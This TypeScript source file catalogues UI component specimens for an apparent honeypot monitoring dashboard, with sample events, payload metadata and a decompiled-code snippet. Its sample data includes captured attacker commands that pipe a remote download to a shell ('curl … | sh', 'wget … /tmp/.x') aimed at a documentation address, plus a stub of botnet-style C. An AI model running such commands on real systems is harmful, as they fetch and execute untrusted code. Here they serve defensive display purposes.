// The design studio's catalogue: every Astryx component the dashboard uses,
// each with one or more variants. Variant A is the current decision (as
// DESIGN.md records it); B, C… are alternatives to compare side by side.
//
// To try an alternative, add a variant to a specimen's `variants`: give it
// the next letter, say what it changes in `note`, and render it with Astryx
// components, props and tokens only (the same rules as the app; see
// DESIGN.md and AGENTS.md). Then `bun run studio` rebuilds index.html.
import type { ReactNode } from 'react'
import { Avatar } from '@astryxdesign/core/Avatar'
import { Badge } from '@astryxdesign/core/Badge'
import { Banner } from '@astryxdesign/core/Banner'
import { BreadcrumbItem, Breadcrumbs } from '@astryxdesign/core/Breadcrumbs'
import { Button } from '@astryxdesign/core/Button'
import { Card } from '@astryxdesign/core/Card'
import { CheckboxInput } from '@astryxdesign/core/CheckboxInput'
import { CodeBlock } from '@astryxdesign/core/CodeBlock'
import { Collapsible } from '@astryxdesign/core/Collapsible'
import { Dialog, DialogHeader } from '@astryxdesign/core/Dialog'
import { Divider } from '@astryxdesign/core/Divider'
import { EmptyState } from '@astryxdesign/core/EmptyState'
import { FieldStatus } from '@astryxdesign/core/FieldStatus'
import { Grid } from '@astryxdesign/core/Grid'
import { Icon } from '@astryxdesign/core/Icon'
import { IconButton } from '@astryxdesign/core/IconButton'
import { Kbd } from '@astryxdesign/core/Kbd'
import { Layout, LayoutContent, LayoutFooter } from '@astryxdesign/core/Layout'
import { Link } from '@astryxdesign/core/Link'
import { List, ListItem } from '@astryxdesign/core/List'
import { MetadataList, MetadataListItem } from '@astryxdesign/core/MetadataList'
import { NumberInput } from '@astryxdesign/core/NumberInput'
import { Pagination } from '@astryxdesign/core/Pagination'
import { RadioList, RadioListItem } from '@astryxdesign/core/RadioList'
import { SegmentedControl, SegmentedControlItem } from '@astryxdesign/core/SegmentedControl'
import { Selector } from '@astryxdesign/core/Selector'
import { Skeleton } from '@astryxdesign/core/Skeleton'
import { Spinner } from '@astryxdesign/core/Spinner'
import { HStack, StackItem, VStack } from '@astryxdesign/core/Stack'
import { StatusDot } from '@astryxdesign/core/StatusDot'
import { Step, Stepper } from '@astryxdesign/core/Stepper'
import { Switch } from '@astryxdesign/core/Switch'
import { Table, pixel, proportional } from '@astryxdesign/core/Table'
import type { TableColumn } from '@astryxdesign/core/Table'
import { Heading, Text } from '@astryxdesign/core/Text'
import { TextArea } from '@astryxdesign/core/TextArea'
import { TextInput } from '@astryxdesign/core/TextInput'
import { Token } from '@astryxdesign/core/Token'
import { ArrowDownTrayIcon, ArrowTopRightOnSquareIcon, MagnifyingGlassIcon, WrenchScrewdriverIcon } from '@heroicons/react/24/outline'
import { ActionLink } from '#/components/ActionLink'

export type Variant = {
  /** A, B, C…: A is the current decision. */
  key: string
  title: string
  /** What this variant decides, or how it differs from A. */
  note: string
  render: () => ReactNode
}

export type Specimen = {
  id: string
  name: string
  /** The Astryx components it is made of. */
  uses: string
  /** The DESIGN.md rule it follows. */
  rule: string
  variants: Variant[]
}

export type SpecimenGroup = { title: string; specimens: Specimen[] }

const noop = () => {}

// Specimen data, written inline: documentation ranges only (RFC 5737,
// example.test), never the dashboard's data layer.
type EventRow = { id: string; time: string; severity: string; sensor: string; source: string; detail: string }
const EVENTS: EventRow[] = [
  { id: '1', time: '14:02', severity: 'high', sensor: 'cowrie', source: '198.51.100.13', detail: 'curl -s http://203.0.113.251/x | sh' },
  { id: '2', time: '14:01', severity: 'medium', sensor: 'dionaea', source: '192.0.2.44', detail: 'MSSQL login sa/sa' },
  { id: '3', time: '14:01', severity: 'low', sensor: 'conpot-s7-1200', source: '203.0.113.9', detail: 'modbus connection' },
  { id: '4', time: '13:59', severity: 'info', sensor: 'multipot', source: '192.0.2.200', detail: 'IMAP connection' },
]
const SEVERITY_COLOR = { high: 'red', medium: 'orange', low: 'blue', info: 'gray' } as const
const severity = (s: string) => <Token size="sm" label={s} color={SEVERITY_COLOR[s as keyof typeof SEVERITY_COLOR]} />
const eventColumns: TableColumn<EventRow>[] = [
  { key: 'time', header: 'Time', width: pixel(72), renderCell: (r) => <Text type="supporting">{r.time}</Text> },
  { key: 'severity', header: 'Severity', width: pixel(96), renderCell: (r) => severity(r.severity) },
  { key: 'sensor', header: 'Sensor', width: pixel(140) },
  { key: 'source', header: 'Source', width: pixel(140), renderCell: (r) => <Link href="#">{r.source}</Link> },
  { key: 'detail', header: 'Detail', width: proportional(1), renderCell: (r) => <Text type="code">{r.detail}</Text> },
]

const DECOMPILED = `void main(int argc, char **argv) {
  killer_init();
  while (1) {
    fd = connect_cnc(resolve_cnc());
    handle_commands(fd);
  }
}`

export const GROUPS: SpecimenGroup[] = [
  {
    title: 'Foundations',
    specimens: [
      {
        id: 'typography',
        name: 'Typography',
        uses: 'Heading, Text',
        rule: 'One humanist sans (Figtree) for everything readable; code for everything an attacker typed or a machine emitted (The Evidence Is Mono Rule). Demote by weight and color, not size.',
        variants: [
          {
            key: 'A',
            title: 'Semantic type scale',
            note: 'Astryx heading levels and text types, base 14px, ratio 1.2.',
            render: () => (
              <VStack gap={3}>
                <Heading level={1}>Event explorer</Heading>
                <Heading level={2}>Activity, last 24h</Heading>
                <Heading level={3}>Ingestion freshness</Heading>
                <Text>Every normalized honeypot event, newest first. Filter by source, sensor, service, or time window.</Text>
                <Text type="supporting">3,094 records · page 1 of 62</Text>
                <Text type="code">wget -q -O /tmp/.x http://203.0.113.251/x</Text>
              </VStack>
            ),
          },
        ],
      },
      {
        id: 'color',
        name: 'Color roles',
        uses: 'Token, Text, Card',
        rule: 'One accent (copper) for action and location; status tones only for status (The One Voice and Earned Red Rules). Every color comes from the theme.',
        variants: [
          {
            key: 'A',
            title: 'Accent, text and status',
            note: 'What the active theme gives each role; switch palettes in the toolbar.',
            render: () => (
              <VStack gap={3}>
                <HStack gap={2} wrap="wrap">
                  <Button label="Primary action" variant="primary" size="sm" />
                  <Link href="#">198.51.100.13</Link>
                  <Text type="supporting">Secondary text</Text>
                </HStack>
                <HStack gap={2} wrap="wrap">
                  <Token size="sm" label="info" color="gray" />
                  <Token size="sm" label="low" color="blue" />
                  <Token size="sm" label="medium" color="orange" />
                  <Token size="sm" label="high" color="red" />
                  <Token size="sm" label="clean" color="green" />
                  <Token size="sm" label="Tsunami" color="purple" />
                </HStack>
                <HStack gap={3} wrap="wrap">
                  <StatusDot variant="success" label="fresh" />
                  <Text>fresh</Text>
                  <StatusDot variant="warning" label="delayed" />
                  <Text>delayed</Text>
                  <StatusDot variant="error" label="stale" />
                  <Text>stale</Text>
                </HStack>
              </VStack>
            ),
          },
        ],
      },
    ],
  },
  {
    title: 'Actions',
    specimens: [
      {
        id: 'button',
        name: 'Button',
        uses: 'Button, IconButton',
        rule: 'Refined and restrained: tinted, not outlined. One primary per region; secondary for page actions; ghost for toolbar and row actions; destructive only in confirm dialogs.',
        variants: [
          {
            key: 'A',
            title: 'Variants as built',
            note: 'Small (sm) size in toolbars and headers.',
            render: () => (
              <VStack gap={3}>
                <HStack gap={2} wrap="wrap">
                  <Button label="Generate report" variant="primary" size="sm" />
                  <Button label="CSV" variant="secondary" size="sm" icon={<Icon icon={ArrowDownTrayIcon} size="sm" />} />
                  <Button label="Operator actions" variant="secondary" size="sm" icon={<Icon icon={WrenchScrewdriverIcon} size="sm" />} />
                  <Button label="Unpin" variant="ghost" size="sm" />
                  <Button label="Discard" variant="destructive" size="sm" />
                </HStack>
                <HStack gap={2} wrap="wrap">
                  <IconButton label="Open in" variant="ghost" size="sm" icon={<Icon icon={ArrowTopRightOnSquareIcon} size="sm" />} />
                  <Button label="Send report" isLoading size="sm" />
                  <Button label="Disabled" isDisabled size="sm" variant="secondary" />
                  <Button label="Evidence handling" variant="secondary" size="sm" elevation="med" />
                </HStack>
              </VStack>
            ),
          },
        ],
      },
      {
        id: 'links',
        name: 'Links and action links',
        uses: 'Link, ActionLink (Button with href)',
        rule: 'A link that is an action looks like a button (ActionLink); a link that is data (an address, a hash, a name) stays a Link.',
        variants: [
          {
            key: 'A',
            title: 'Data link vs. action link',
            note: 'As AGENTS.md defines it.',
            render: () => (
              <VStack gap={3}>
                <Text>
                  Source <Link href="#">198.51.100.13</Link> delivered <Link href="#">320cbb5e902f…</Link>.
                </Text>
                <HStack gap={2} wrap="wrap">
                  <ActionLink href="#">Event explorer</ActionLink>
                  <ActionLink href="#" external>
                    Runbook
                  </ActionLink>
                </HStack>
              </VStack>
            ),
          },
        ],
      },
    ],
  },
  {
    title: 'Status',
    specimens: [
      {
        id: 'token',
        name: 'Token, StatusDot, Badge',
        uses: 'Token, StatusDot, Badge',
        rule: 'Token for severities, verdicts and labels; StatusDot for live state; Badge only for counts.',
        variants: [
          {
            key: 'A',
            title: 'Each for its job',
            note: 'Small tokens in tables, a warning badge for the alert count.',
            render: () => (
              <VStack gap={3}>
                <HStack gap={2} wrap="wrap">
                  <Token size="sm" label="malicious" color="red" />
                  <Token size="sm" label="Tsunami" color="purple" />
                  <Token size="sm" label="dionaea" />
                  <Token size="sm" label="+PROXY" color="teal" />
                </HStack>
                <HStack gap={2} vAlign="center">
                  <StatusDot variant="success" label="running" />
                  <Text>Filebeat running</Text>
                </HStack>
                <HStack gap={2} vAlign="center">
                  <Text>Alerts</Text>
                  <Badge variant="warning" label={21} />
                </HStack>
              </VStack>
            ),
          },
        ],
      },
      {
        id: 'banner',
        name: 'Banner',
        uses: 'Banner',
        rule: 'Inline, flat (elevation none), with the status the message really has; a follow-up action as an ActionLink.',
        variants: [
          {
            key: 'A',
            title: 'Info, success, warning, error',
            note: 'As the pages use them.',
            render: () => (
              <VStack gap={2}>
                <Banner status="info" title="12 events with no source address" description="They arrived over the tunnel with no recoverable client address." />
                <Banner status="success" title="Report filed" description="It lands with the operators." endContent={<ActionLink href="#">Open the report</ActionLink>} />
                <Banner status="warning" title="Unsaved changes in Branding" description="They are staged, not saved." />
                <Banner status="error" title="Not queued" description="The backend did not answer." isDismissable onDismiss={noop} />
              </VStack>
            ),
          },
        ],
      },
      {
        id: 'empty',
        name: 'Empty state',
        uses: 'EmptyState',
        rule: 'Says what is empty and what to do next; never a dead end.',
        variants: [
          {
            key: 'A',
            title: 'With icon and next step',
            note: 'The search page before a query.',
            render: () => <EmptyState icon={<Icon icon={MagnifyingGlassIcon} size="lg" />} title="Search everything" description="Try an IP prefix like 198.51, a username like root, or a family like Mirai." />,
          },
        ],
      },
      {
        id: 'loading',
        name: 'Loading',
        uses: 'Skeleton, Spinner',
        rule: 'Pages show their own layout with skeletons first, then data; a spinner only inside a control that is working.',
        variants: [
          {
            key: 'A',
            title: 'Skeleton lines and a working control',
            note: 'Skeleton shapes match the content they stand for.',
            render: () => (
              <VStack gap={2}>
                <Skeleton width={200} height={18} />
                <Skeleton width="90%" height={14} />
                <Skeleton width="70%" height={14} />
                <HStack gap={2} vAlign="center">
                  <Spinner size="sm" />
                  <Text type="supporting">Checking the stream…</Text>
                </HStack>
              </VStack>
            ),
          },
        ],
      },
    ],
  },
  {
    title: 'Data',
    specimens: [
      {
        id: 'table',
        name: 'Table',
        uses: 'Table, Token, Link, Text',
        rule: 'The signature component: rows edge-to-edge with dividers, captured values as code, each row opens its entity (dense data renders as rows).',
        variants: [
          {
            key: 'A',
            title: 'Event explorer rows',
            note: 'Compact density, hover tint.',
            render: () => <Table data={EVENTS} columns={eventColumns} idKey="id" density="compact" hasHover />,
          },
        ],
      },
      {
        id: 'list',
        name: 'List',
        uses: 'List, ListItem',
        rule: 'Collections that are not tabular are List rows with dividers, never Cards.',
        variants: [
          {
            key: 'A',
            title: 'Compact with dividers',
            note: 'Search results, tool-call traces.',
            render: () => (
              <List density="compact" hasDividers>
                <ListItem label="198.51.100.13" description="AS64500 Example Hosting · NL · 412 events" />
                <ListItem label="192.0.2.44" description="AS64501 Example Transit · US · 88 events" />
                <ListItem label="203.0.113.9" description="AS64502 Example Cloud · DE · 12 events" />
              </List>
            ),
          },
        ],
      },
      {
        id: 'metadata',
        name: 'Metadata list',
        uses: 'MetadataList, MetadataListItem',
        rule: 'Facts as label and value pairs; values that are evidence set as code.',
        variants: [
          {
            key: 'A',
            title: 'Labels at the start',
            note: 'Payload details.',
            render: () => (
              <MetadataList label={{ position: 'start', width: 136 }}>
                <MetadataListItem label="File type">ELF 32-bit LSB executable, arm</MetadataListItem>
                <MetadataListItem label="Size">1,931,545 bytes</MetadataListItem>
                <MetadataListItem label="MD5">
                  <Text type="code">fb89608e10929d300d567625632d2881</Text>
                </MetadataListItem>
              </MetadataList>
            ),
          },
        ],
      },
      {
        id: 'code',
        name: 'Code block',
        uses: 'CodeBlock',
        rule: 'Every code block wraps; colors come from the palette\'s syntax theme.',
        variants: [
          {
            key: 'A',
            title: 'Wrapped, palette syntax',
            note: 'Decompiled code from a Ghidra result.',
            render: () => <CodeBlock isWrapped code={DECOMPILED} language="c" maxHeight={240} />,
          },
        ],
      },
      {
        id: 'card',
        name: 'Card',
        uses: 'Card, Heading, Text',
        rule: 'Only for self-contained widgets (KPI tiles, charts), flat (elevation none), never around rows or sections, never nested.',
        variants: [
          {
            key: 'A',
            title: 'KPI tiles',
            note: 'The overview\'s headline numbers.',
            render: () => (
              <Grid columns={{ minWidth: 160, repeat: 'fit' }} gap={3}>
                <Card>
                  <VStack gap={1}>
                    <Text type="supporting">Events</Text>
                    <Heading level={2}>3.1K</Heading>
                    <Text type="supporting">Last 24h vs. previous 24h</Text>
                  </VStack>
                </Card>
                <Card>
                  <VStack gap={1}>
                    <Text type="supporting">Unique sources</Text>
                    <Heading level={2}>140</Heading>
                    <Text type="supporting">Last 24h vs. previous 24h</Text>
                  </VStack>
                </Card>
              </Grid>
            ),
          },
        ],
      },
    ],
  },
  {
    title: 'Forms',
    specimens: [
      {
        id: 'inputs',
        name: 'Text inputs',
        uses: 'TextInput, TextArea, NumberInput, FieldStatus',
        rule: 'Controlled inputs; errors appear under the field after the first attempt.',
        variants: [
          {
            key: 'A',
            title: 'Fields with an error',
            note: 'Report a problem and the admin limits.',
            render: () => (
              <VStack gap={3}>
                <TextInput label="Search" placeholder="IP, session, hash, credential, command…" value="" onChange={noop} />
                <TextArea label="What did you expect?" rows={2} value="" onChange={noop} status={{ type: 'error', message: 'Say what you expected, so the report can be acted on.' }} />
                <NumberInput label="Export cap" min={100} max={100_000} step={500} units="rows" value={10_000} onChange={noop} />
                <FieldStatus type="error" variant="detached" message="Not saved: the backend did not answer." />
              </VStack>
            ),
          },
        ],
      },
      {
        id: 'choices',
        name: 'Choices',
        uses: 'Selector, SegmentedControl, Switch, CheckboxInput, RadioList',
        rule: 'One control size per row; a segmented control for two to four exclusive options, a selector beyond that.',
        variants: [
          {
            key: 'A',
            title: 'Settings controls',
            note: 'From Settings → Appearance and the canarytoken wizard.',
            render: () => (
              <VStack gap={3}>
                <Selector
                  label="Palette"
                  value="claude"
                  onChange={noop}
                  options={[
                    { value: 'claude', label: 'Claude' },
                    { value: 'sage', label: 'Sage' },
                    { value: 'ocean', label: 'Ocean' },
                  ]}
                />
                <SegmentedControl label="Density" value="comfortable" onChange={noop}>
                  <SegmentedControlItem value="comfortable" label="Comfortable" />
                  <SegmentedControlItem value="compact" label="Compact" />
                </SegmentedControl>
                <Switch label="High contrast" value={false} onChange={noop} />
                <CheckboxInput label="Include a snapshot of this page" description="Credentials, tokens and cookies are removed first." value onChange={noop} />
                <RadioList label="What kind of token" value="dns" onChange={noop}>
                  <RadioListItem value="dns" label="DNS" description="Fires when the name is resolved." />
                  <RadioListItem value="web" label="Web bug" description="Fires when the URL is fetched." />
                </RadioList>
              </VStack>
            ),
          },
        ],
      },
    ],
  },
  {
    title: 'Navigation',
    specimens: [
      {
        id: 'wayfinding',
        name: 'Breadcrumbs, pagination, stepper',
        uses: 'Breadcrumbs, Pagination, Stepper, Kbd',
        rule: 'Breadcrumbs on untabbed pages; pagination under long tables; a compact stepper in wizards.',
        variants: [
          {
            key: 'A',
            title: 'As the shell uses them',
            note: 'Supporting breadcrumbs, the search shortcut.',
            render: () => (
              <VStack gap={3}>
                <Breadcrumbs variant="supporting" label="You are here">
                  <BreadcrumbItem isCurrent={false}>Investigate</BreadcrumbItem>
                  <BreadcrumbItem isCurrent>Event explorer</BreadcrumbItem>
                </Breadcrumbs>
                <Pagination page={1} totalPages={62} onChange={noop} />
                <Stepper activeStep={1} orientation="horizontal" density="compact" label="New analysis run progress">
                  <Step step={0} label="Sample" />
                  <Step step={1} label="Analyzers" />
                  <Step step={2} label="Review" />
                </Stepper>
                <HStack gap={2} vAlign="center">
                  <Text>Search</Text>
                  <Kbd keys="⌘K" />
                </HStack>
              </VStack>
            ),
          },
        ],
      },
      {
        id: 'disclosure',
        name: 'Collapsible',
        uses: 'Collapsible',
        rule: 'Long secondary detail folds away; the first section starts open.',
        variants: [
          {
            key: 'A',
            title: 'Analyzer sections',
            note: 'Payload workbench.',
            render: () => (
              <VStack gap={2}>
                <Collapsible trigger="Static analysis" defaultIsOpen>
                  <Text>Entropy 7.2, packed with UPX, 3 YARA matches.</Text>
                </Collapsible>
                <Collapsible trigger="Sandbox">
                  <Text>Detonated for 120 s.</Text>
                </Collapsible>
              </VStack>
            ),
          },
        ],
      },
    ],
  },
  {
    title: 'Overlays',
    specimens: [
      {
        id: 'dialog',
        name: 'Dialog',
        uses: 'Dialog, DialogHeader, Layout, Button',
        rule: 'Every modal goes through AppDialog / ConfirmDialog: the scrim, Escape and the close button close it; unsaved input asks first; focus returns to the opener. Shown inline here.',
        variants: [
          {
            key: 'A',
            title: 'Confirm dialog',
            note: 'The destructive action is never the default.',
            render: () => (
              <Dialog isOpen isInline onOpenChange={noop} width={440}>
                <Layout
                  padding={4}
                  header={<DialogHeader title="Discard changes?" onOpenChange={noop} hasDivider={false} />}
                  content={
                    <LayoutContent>
                      <Text>What you entered in this dialog has not been saved.</Text>
                    </LayoutContent>
                  }
                  footer={
                    <LayoutFooter hasDivider={false}>
                      <HStack gap={2} vAlign="center">
                        <StackItem size="fill" />
                        <Button label="Keep editing" variant="secondary" />
                        <Button label="Discard" variant="destructive" />
                      </HStack>
                    </LayoutFooter>
                  }
                />
              </Dialog>
            ),
          },
        ],
      },
      {
        id: 'identity',
        name: 'Avatar and divider',
        uses: 'Avatar, Divider',
        rule: 'Avatars only for actors (RevDeck, operators); dividers fence peers, not sections.',
        variants: [
          {
            key: 'A',
            title: 'As built',
            note: 'RevDeck in the conversation view.',
            render: () => (
              <VStack gap={3}>
                <HStack gap={2} vAlign="center">
                  <Avatar name="RevDeck" size="md" />
                  <Text>RevDeck · triage-v2</Text>
                </HStack>
                <Divider />
                <Text type="supporting">Below the divider</Text>
              </VStack>
            ),
          },
        ],
      },
    ],
  },
]
